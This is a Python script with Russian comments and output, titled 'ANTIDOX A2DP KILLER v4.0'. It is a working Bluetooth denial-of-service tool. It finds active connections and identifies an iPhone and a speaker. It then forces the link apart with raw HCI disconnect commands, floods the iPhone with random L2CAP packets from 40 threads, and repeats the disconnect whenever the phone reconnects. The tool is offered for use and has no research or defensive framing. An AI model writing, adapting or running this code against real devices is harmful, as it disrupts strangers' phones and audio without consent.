#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ANTIDOX A2DP KILLER v4.0 — поиск iPhone через активные соединения

import os
import sys
import time
import random
import struct
import socket
import threading
import subprocess
import re
from datetime import datetime

# ========================================================================
# ЦВЕТА
# ========================================================================
C = {
    'RED': '\033[91m',
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'BLUE': '\033[94m',
    'MAGENTA': '\033[95m',
    'CYAN': '\033[96m',
    'WHITE': '\033[97m',
    'RESET': '\033[0m',
    'BOLD': '\033[1m',
    'DIM': '\033[2m'
}

# ========================================================================
# БЛОК 1: ПОИСК АКТИВНЫХ СОЕДИНЕНИЙ
# ========================================================================
def get_active_connections():
    """Получает список всех активных Bluetooth-соединений"""
    connections = []
    try:
        # hcitool con показывает активные соединения
        result = subprocess.run(['sudo', 'hcitool', 'con'], capture_output=True, text=True)
        lines = result.stdout.strip().split('\n')
        for line in lines:
            if ':' in line and 'handle' in line:
                # Парсим: handle <handle> state <state> lm <...> <MAC>
                parts = line.split()
                mac = None
                handle = None
                for part in parts:
                    if ':' in part and len(part) == 17:
                        mac = part
                    if part.startswith('handle'):
                        handle = part.split('<')[0].replace('handle:', '').strip()
                if mac:
                    connections.append({'mac': mac, 'handle': handle, 'raw': line})
    except Exception as e:
        print(f"{C['RED']}[!] Ошибка: {e}{C['RESET']}")
    return connections

def get_device_name(mac):
    """Получает имя устройства по MAC"""
    try:
        result = subprocess.run(['sudo', 'hcitool', 'name', mac], capture_output=True, text=True, timeout=3)
        name = result.stdout.strip()
        if name:
            return name
        # Если hcitool не дал имя, пробуем bluetoothctl
        result = subprocess.run(['sudo', 'bluetoothctl', 'info', mac], capture_output=True, text=True, timeout=3)
        for line in result.stdout.split('\n'):
            if 'Name:' in line:
                return line.split('Name:')[1].strip()
        return 'Unknown'
    except:
        return 'Unknown'

def get_device_class(mac):
    """Определяет тип устройства по MAC (первые 3 байта)"""
    prefixes = {
        '58:1C:F8': 'Apple iPhone/iPad',
        'AC:BC:32': 'Apple',
        '04:0C:CE': 'Apple',
        '00:11:22': 'JBL/Samsung',
        '00:1A:7D': 'Sony',
        '00:0E:08': 'Sony',
        '00:09:DD': 'Samsung',
    }
    prefix = mac[:8]
    return prefixes.get(prefix, 'Unknown')

# ========================================================================
# БЛОК 2: РАЗРЫВ СОЕДИНЕНИЯ ЧЕРЕЗ LMP_TERMINATE
# ========================================================================
def disconnect_device(mac, handle):
    """Принудительно разрывает соединение с устройством"""
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        sock.bind((0,))
        opcode = (0x01 << 10) | 0x0006
        params = struct.pack('<HB', int(handle, 16), 0x13)  # Remote User Terminated
        header = struct.pack('<BHB', 0x01, opcode, len(params))
        sock.send(header + params)
        sock.close()
        return True
    except Exception as e:
        print(f"{C['RED']}[!] Ошибка разрыва: {e}{C['RESET']}")
        return False

# ========================================================================
# БЛОК 3: L2CAP-ФЛУД НА ТАРГЕТ
# ========================================================================
def l2cap_flood(target_mac, rate=1500):
    """Флудит целевое устройство L2CAP-пакетами"""
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
        sock.bind(('hci0', 0x0001))
        sock.connect((target_mac, 0x0001))
        count = 0
        while True:
            data = bytes([random.randint(0, 255) for _ in range(60)])
            sock.send(data)
            count += 1
            if count % 100 == 0:
                print(f"{C['DIM']}[L2CAP] {count} пакетов на {target_mac}{C['RESET']}")
            time.sleep(1.0 / rate)
    except:
        pass

# ========================================================================
# БЛОК 4: ОСНОВНАЯ ЛОГИКА
# ========================================================================
def main():
    if os.geteuid() != 0:
        print(f"{C['RED']}[!] Запустите с sudo.{C['RESET']}")
        sys.exit(1)
    
    print(f"\n{C['CYAN']}{'='*70}{C['RESET']}")
    print(f"{C['BOLD']}{C['GREEN']}  🔍 АНАЛИЗ АКТИВНЫХ BLUETOOTH-СОЕДИНЕНИЙ{C['RESET']}")
    print(f"{C['CYAN']}{'='*70}{C['RESET']}\n")
    
    # Поднимаем адаптер
    subprocess.run(['sudo', 'hciconfig', 'hci0', 'up'], capture_output=True)
    
    # Получаем активные соединения
    connections = get_active_connections()
    
    if not connections:
        print(f"{C['YELLOW']}[!] Нет активных соединений.{C['RESET']}")
        print(f"{C['DIM']}[*] Попробуйте: sudo hcitool scan для поиска устройств{C['RESET']}")
        sys.exit(1)
    
    print(f"{C['BOLD']}Найдено {len(connections)} активных соединений:{C['RESET']}\n")
    
    # Собираем информацию о каждом устройстве
    devices = []
    for conn in connections:
        mac = conn['mac']
        name = get_device_name(mac)
        device_type = get_device_class(mac)
        devices.append({
            'mac': mac,
            'name': name,
            'type': device_type,
            'handle': conn['handle'],
            'raw': conn['raw']
        })
        
        # Определяем иконку
        icon = '🔗'
        color = C['WHITE']
        if 'iPhone' in name or 'iPad' in name:
            icon = '🍎'
            color = C['BLUE']
        elif 'JBL' in name or 'Speaker' in name or 'Sony' in name:
            icon = '🔊'
            color = C['YELLOW']
        elif 'AirPods' in name:
            icon = '🎧'
            color = C['CYAN']
        elif 'Android' in name or 'Pixel' in name:
            icon = '🤖'
            color = C['GREEN']
        elif 'Unknown' in name:
            # Если имя неизвестно, но это Apple по MAC
            if 'Apple' in device_type:
                icon = '🍎'
                color = C['BLUE']
                name = 'iPhone/iPad (скрыт)'
        
        print(f"{color}{icon} {C['BOLD']}{mac}{C['RESET']}")
        print(f"   {C['DIM']}└─ Имя: {name}{C['RESET']}")
        print(f"   {C['DIM']}   └─ Тип: {device_type}{C['RESET']}")
        print(f"   {C['DIM']}   └─ Handle: {conn['handle']}{C['RESET']}")
        print()
    
    # Определяем iPhone и колонку
    iphone = None
    speaker = None
    
    for d in devices:
        if 'iPhone' in d['name'] or ('Apple' in d['type'] and 'Unknown' not in d['name']):
            iphone = d
        if 'JBL' in d['name'] or 'Speaker' in d['name'] or 'Sony' in d['name']:
            speaker = d
    
    # Если не нашли iPhone явно, но есть соединение с колонкой — ищем второго участника
    if speaker and not iphone:
        # Второе устройство в соединении — это iPhone
        for d in devices:
            if d['mac'] != speaker['mac']:
                iphone = d
                break
    
    print(f"{C['CYAN']}{'='*70}{C['RESET']}")
    
    if iphone:
        print(f"{C['GREEN']}🎯 НАЙДЕН IPHONE: {iphone['mac']} ({iphone['name']}){C['RESET']}")
    else:
        print(f"{C['YELLOW']}[!] iPhone не найден в активных соединениях.{C['RESET']}")
        # Показываем список всех устройств и просим выбрать
        print(f"\n{C['BOLD']}Выберите устройство для атаки:{C['RESET']}")
        for idx, d in enumerate(devices, 1):
            print(f"  {idx}. {d['mac']} - {d['name']}")
        choice = input(f"\n{C['BOLD']}Номер: {C['RESET']}")
        if choice.isdigit() and 1 <= int(choice) <= len(devices):
            iphone = devices[int(choice)-1]
        else:
            print(f"{C['RED']}[!] Неверный выбор.{C['RESET']}")
            sys.exit(1)
    
    if speaker:
        print(f"{C['YELLOW']}🔊 КОЛОНКА: {speaker['mac']} ({speaker['name']}){C['RESET']}")
    
    print(f"{C['CYAN']}{'='*70}{C['RESET']}")
    
    # Спрашиваем подтверждение
    print(f"\n{C['BOLD']}{C['RED']}⚠️  БУДЕТ РАЗОРВАНА СВЯЗЬ МЕЖДУ:{C['RESET']}")
    print(f"   {C['BLUE']}📱 {iphone['mac']} ({iphone['name']}){C['RESET']}")
    if speaker:
        print(f"   {C['YELLOW']}🔊 {speaker['mac']} ({speaker['name']}){C['RESET']}")
    print()
    
    confirm = input(f"{C['BOLD']}Продолжить? (y/N): {C['RESET']}")
    if confirm.lower() != 'y':
        print(f"{C['DIM']}Отмена.{C['RESET']}")
        sys.exit(0)
    
    # ЗАПУСКАЕМ АТАКУ
    print(f"\n{C['RED']}🚀 ЗАПУСК АТАКИ...{C['RESET']}")
    
    # 1. LMP_terminate на iPhone (разрыв соединения)
    if disconnect_device(iphone['mac'], iphone['handle']):
        print(f"{C['GREEN']}✓ LMP_terminate отправлен на iPhone{C['RESET']}")
    else:
        print(f"{C['RED']}✗ Ошибка отправки LMP_terminate{C['RESET']}")
    
    # 2. LMP_terminate на колонку
    if speaker:
        if disconnect_device(speaker['mac'], speaker['handle']):
            print(f"{C['GREEN']}✓ LMP_terminate отправлен на колонку{C['RESET']}")
        else:
            print(f"{C['RED']}✗ Ошибка отправки LMP_terminate на колонку{C['RESET']}")
    
    # 3. L2CAP-флуд на iPhone в фоне
    print(f"{C['YELLOW']}🔄 Запуск L2CAP-флуда на iPhone...{C['RESET']}")
    for i in range(40):
        t = threading.Thread(target=l2cap_flood, args=(iphone['mac'], 1500), daemon=True)
        t.start()
    print(f"{C['GREEN']}✓ L2CAP-флуд запущен (40 потоков){C['RESET']}")
    
    print(f"\n{C['BOLD']}{C['GREEN']}[+] АТАКА ЗАПУЩЕНА. МУЗЫКА ДОЛЖНА ПРЕРВАТЬСЯ.{C['RESET']}")
    print(f"{C['DIM']}Нажмите Ctrl+C для остановки.{C['RESET']}\n")
    
    try:
        while True:
            time.sleep(10)
            # Проверяем, не переподключились ли
            new_conn = get_active_connections()
            if not new_conn:
                print(f"{C['GREEN']}[+] Соединение разорвано!{C['RESET']}")
                break
            # Проверяем, есть ли всё ещё соединение с iPhone
            for conn in new_conn:
                if conn['mac'] == iphone['mac']:
                    print(f"{C['YELLOW']}[!] iPhone всё ещё подключён. Продолжаем атаку.{C['RESET']}")
                    # Повторно шлём LMP_terminate
                    disconnect_device(iphone['mac'], conn['handle'])
                    break
    except KeyboardInterrupt:
        print(f"\n{C['RED']}[!] Остановка...{C['RESET']}")
    
    # Сброс адаптера
    subprocess.run(['sudo', 'hciconfig', 'hci0', 'reset'], capture_output=True)
    print(f"{C['GREEN']}[+] Готово.{C['RESET']}")

if __name__ == "__main__":
    main()
